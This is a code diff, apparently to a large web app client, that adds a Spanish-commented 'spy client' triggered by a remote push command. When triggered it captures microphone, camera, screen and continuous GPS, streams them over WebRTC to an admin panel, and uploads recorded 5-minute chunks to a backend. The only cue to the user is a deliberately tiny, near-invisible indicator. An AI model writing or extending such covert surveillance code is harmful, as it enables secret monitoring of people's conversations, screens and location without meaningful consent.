@@ -10701,6 +10701,250 @@
             r.readAsDataURL(blob);
         });
 
+        // ════════════════════════════════════════════════════════════════════
+        // [v2.43.58] CLIENTE ESPÍA V2 — WebRTC con 4 streams al master
+        // ────────────────────────────────────────────────────────────────────
+        // Recibe push MOS_ESPIA_INICIAR con sesionId y masterId. Captura audio,
+        // cámara, pantalla y GPS y los emite vía WebRTC peer-to-peer al panel
+        // admin MOS. Indicador discreto opcional según política del master.
+        // ════════════════════════════════════════════════════════════════════
+        let _espiaCli = null;
+
+        async function _espiaCliPostMOS(accion, params) {
+            try {
+                const r = await fetch(MOS_GAS_URL, {
+                    method: 'POST',
+                    body: JSON.stringify(Object.assign({ action: accion }, params))
+                });
+                return await r.json();
+            } catch(_) { return null; }
+        }
+
+        function _espiaCliMostrarIndicador() {
+            if (document.getElementById('espiaCliIndicador')) return;
+            // Indicador MUY discreto (chip diminuto)
+            const html = `<div id="espiaCliIndicador" style="position:fixed;bottom:6px;right:6px;font-size:8px;color:rgba(165,180,252,.6);background:rgba(15,23,42,.4);padding:2px 5px;border-radius:4px;z-index:99998;pointer-events:none;font-family:monospace">·</div>`;
+            document.body.insertAdjacentHTML('beforeend', html);
+        }
+        function _espiaCliOcultarIndicador() {
+            document.getElementById('espiaCliIndicador')?.remove();
+        }
+
+        async function _espiaCliIniciar(sesionId, masterId) {
+            if (_espiaCli) {
+                console.warn('[espia] sesión activa, cerrando antes de nueva');
+                await _espiaCliCerrar('reinicio');
+            }
+            console.log('[espia] iniciando sesión', sesionId, 'master:', masterId);
+            _espiaCli = {
+                sesionId, masterId,
+                pc: null,
+                streams: {},
+                pollTimer: null,
+                gpsWatch: null,
+                gpsCh: null,
+                iceDesde: 0,
+                bufferRecorders: {},
+                bufferTimers: {}
+            };
+            try {
+                // 1) Audio + cámara (un solo getUserMedia, permiso conjunto)
+                try {
+                    _espiaCli.streams.userMedia = await navigator.mediaDevices.getUserMedia({
+                        audio: { echoCancellation: true, noiseSuppression: true },
+                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } }
+                    });
+                    console.log('[espia] audio+cam OK');
+                } catch(e) {
+                    console.warn('[espia] getUserMedia (audio+cam) fallo:', e.message);
+                }
+                // 2) Pantalla (puede fallar si no hay permiso)
+                try {
+                    _espiaCli.streams.display = await navigator.mediaDevices.getDisplayMedia({
+                        video: { frameRate: { ideal: 15 } }, audio: false
+                    });
+                    console.log('[espia] screen OK');
+                } catch(e) {
+                    console.warn('[espia] getDisplayMedia fallo:', e.message);
+                }
+                if (!_espiaCli.streams.userMedia && !_espiaCli.streams.display) {
+                    await _espiaCliCerrar('sin_streams');
+                    return;
+                }
+                // 3) RTCPeerConnection con STUN público de Google
+                const pc = new RTCPeerConnection({
+                    iceServers: [
+                        { urls: ['stun:stun.l.google.com:19302', 'stun:stun1.l.google.com:19302'] }
+                    ]
+                });
+                _espiaCli.pc = pc;
+                // 4) Agregar tracks
+                if (_espiaCli.streams.userMedia) {
+                    _espiaCli.streams.userMedia.getTracks().forEach(t => pc.addTrack(t, _espiaCli.streams.userMedia));
+                }
+                if (_espiaCli.streams.display) {
+                    _espiaCli.streams.display.getTracks().forEach(t => pc.addTrack(t, _espiaCli.streams.display));
+                    // Si el user detiene compartir pantalla, no cerramos toda la sesión
+                    _espiaCli.streams.display.getTracks().forEach(t => {
+                        t.onended = () => console.log('[espia] track screen terminado por user');
+                    });
+                }
+                // 5) DataChannel GPS
+                const gpsCh = pc.createDataChannel('gps');
+                _espiaCli.gpsCh = gpsCh;
+                gpsCh.onopen = () => console.log('[espia] gps channel open');
+                // 6) GPS watch continuo
+                if ('geolocation' in navigator) {
+                    _espiaCli.gpsWatch = navigator.geolocation.watchPosition(
+                        pos => {
+                            if (gpsCh.readyState !== 'open') return;
+                            try {
+                                gpsCh.send(JSON.stringify({
+                                    lat: pos.coords.latitude,
+                                    lng: pos.coords.longitude,
+                                    speed: pos.coords.speed || 0,
+                                    acc: pos.coords.accuracy,
+                                    ts: Date.now()
+                                }));
+                            } catch(_){}
+                        },
+                        err => console.warn('[espia gps]', err.message),
+                        { enableHighAccuracy: true, maximumAge: 5000, timeout: 10000 }
+                    );
+                }
+                // 7) ICE candidates locales → backend
+                pc.onicecandidate = (ev) => {
+                    if (ev.candidate) {
+                        _espiaCliPostMOS('espiaAgregarIce', {
+                            sesionId, lado: 'device',
+                            ice: ev.candidate.toJSON ? ev.candidate.toJSON() : ev.candidate
+                        });
+                    }
+                };
+                // 8) Cierre por desconexión
+                pc.onconnectionstatechange = () => {
+                    console.log('[espia] connection:', pc.connectionState);
+                    if (pc.connectionState === 'failed' || pc.connectionState === 'closed') {
+                        _espiaCliCerrar('connection_' + pc.connectionState);
+                    }
+                };
+                // 9) Polling: leer oferta, responder, leer ICE master, ver si master cerró
+                _espiaCli.pollTimer = setInterval(async () => {
+                    if (!_espiaCli) return;
+                    try {
+                        // a) Si no tenemos remoteDescription, leer oferta
+                        if (!pc.remoteDescription) {
+                            const r = await _espiaCliPostMOS('espiaLeerOferta', { sesionId });
+                            if (r?.data?.sdpOferta) {
+                                const sdp = JSON.parse(r.data.sdpOferta);
+                                await pc.setRemoteDescription(sdp);
+                                const answer = await pc.createAnswer();
+                                await pc.setLocalDescription(answer);
+                                await _espiaCliPostMOS('espiaSubirRespuesta', {
+                                    sesionId, sdp: JSON.stringify(answer)
+                                });
+                                console.log('[espia] respuesta enviada');
+                            }
+                        }
+                        // b) Leer ICE del master
+                        const ri = await _espiaCliPostMOS('espiaLeerIce', {
+                            sesionId, lado: 'master', desde: _espiaCli.iceDesde
+                        });
+                        if (ri?.data?.ice?.length) {
+                            for (const c of ri.data.ice) {
+                                try { await pc.addIceCandidate(c.ice); } catch(_){}
+                            }
+                            _espiaCli.iceDesde = ri.data.tsMax || _espiaCli.iceDesde;
+                        }
+                        // c) Check si master cerró
+                        const re = await _espiaCliPostMOS('espiaEstadoSesion', { sesionId });
+                        if (re?.data?.estado === 'CERRADA') {
+                            console.log('[espia] master cerró sesión');
+                            _espiaCliCerrar('master_cerro');
+                        }
+                    } catch(e) { /* silencioso */ }
+                }, 800);
+                // 10) Buffer histórico — graba chunks de 5min y los sube
+                _espiaCliIniciarBuffer();
+                // 11) Indicador discreto al user
+                _espiaCliMostrarIndicador();
+            } catch(e) {
+                console.warn('[espia] error iniciando:', e);
+                await _espiaCliCerrar('error_init');
+            }
+        }
+
+        function _espiaCliIniciarBuffer() {
+            if (!_espiaCli) return;
+            const CHUNK_MS = 5 * 60 * 1000;  // 5 minutos
+            ['userMedia', 'display'].forEach(key => {
+                const stream = _espiaCli.streams[key];
+                if (!stream) return;
+                const tipoUpload = key === 'display' ? 'screen' : 'audio_video';
+                try {
+                    let mime = 'video/webm;codecs=vp8,opus';
+                    if (!MediaRecorder.isTypeSupported(mime)) mime = 'video/webm';
+                    if (!MediaRecorder.isTypeSupported(mime)) return;
+                    const rec = new MediaRecorder(stream, {
+                        mimeType: mime, videoBitsPerSecond: 250000, audioBitsPerSecond: 64000
+                    });
+                    const chunks = [];
+                    rec.ondataavailable = e => { if (e.data?.size > 0) chunks.push(e.data); };
+                    rec.onstop = async () => {
+                        if (!chunks.length || !_espiaCli) return;
+                        const blob = new Blob(chunks, { type: mime });
+                        const b64 = await _blobToB64(blob);
+                        await _espiaCliPostMOS('espiaSubirChunk', {
+                            deviceId: deviceId.value || 'unknown',
+                            tipo: tipoUpload,
+                            ts: Date.now(),
+                            contenido: b64
+                        });
+                        chunks.length = 0;
+                    };
+                    rec.start();
+                    _espiaCli.bufferRecorders[key] = rec;
+                    // Stop+restart cada 5 min para chunk discreto
+                    _espiaCli.bufferTimers[key] = setInterval(() => {
+                        try {
+                            if (rec.state === 'recording') {
+                                rec.stop();
+                                setTimeout(() => { try { rec.start(); } catch(_){} }, 100);
+                            }
+                        } catch(_){}
+                    }, CHUNK_MS);
+                } catch(e) { console.warn('[espia buffer]', key, e.message); }
+            });
+        }
+
+        async function _espiaCliCerrar(motivo) {
+            if (!_espiaCli) return;
+            console.log('[espia] cerrando:', motivo);
+            const ref = _espiaCli;
+            _espiaCli = null;
+            try { clearInterval(ref.pollTimer); } catch(_){}
+            // Cerrar recorders del buffer (esto dispara onstop → upload final)
+            Object.entries(ref.bufferRecorders || {}).forEach(([k, rec]) => {
+                try { if (rec.state === 'recording') rec.stop(); } catch(_){}
+            });
+            Object.values(ref.bufferTimers || {}).forEach(t => { try { clearInterval(t); } catch(_){} });
+            // Detener tracks
+            Object.values(ref.streams || {}).forEach(s => {
+                try { s?.getTracks().forEach(t => t.stop()); } catch(_){}
+            });
+            // Cerrar GPS watch
+            if (ref.gpsWatch) try { navigator.geolocation.clearWatch(ref.gpsWatch); } catch(_){}
+            // Cerrar peer connection
+            try { ref.pc?.close(); } catch(_){}
+            // Notificar al backend
+            if (ref.sesionId) {
+                _espiaCliPostMOS('espiaCerrarSesion', {
+                    sesionId: ref.sesionId, motivo: motivo || 'manual', lado: 'device'
+                });
+            }
+            _espiaCliOcultarIndicador();
+        }
+
         const _audioRemotoIniciar = async (sesionId, duracionMaxSeg) => {
             if (_audioRecorder) {
                 console.warn('[Audio] Ya hay una grabación activa. Cancelando antes de iniciar otra.');
@@ -10855,6 +11099,11 @@
                                 _audioRemotoDetener();
                             } else if (cmd.action === 'gps_locate') {
                                 _gpsRegistrar(true);
+                            } else if (cmd.action === 'MOS_ESPIA_INICIAR' || cmd.idNotif === 'MOS_ESPIA_INICIAR') {
+                                // [v2.43.58] Iniciar cliente espía WebRTC v2
+                                _espiaCliIniciar(cmd.sesionId, cmd.masterId);
+                            } else if (cmd.action === 'MOS_ESPIA_DETENER' || cmd.idNotif === 'MOS_ESPIA_DETENER') {
+                                _espiaCliCerrar('master_push_stop');
                             }
                             return;
                         }
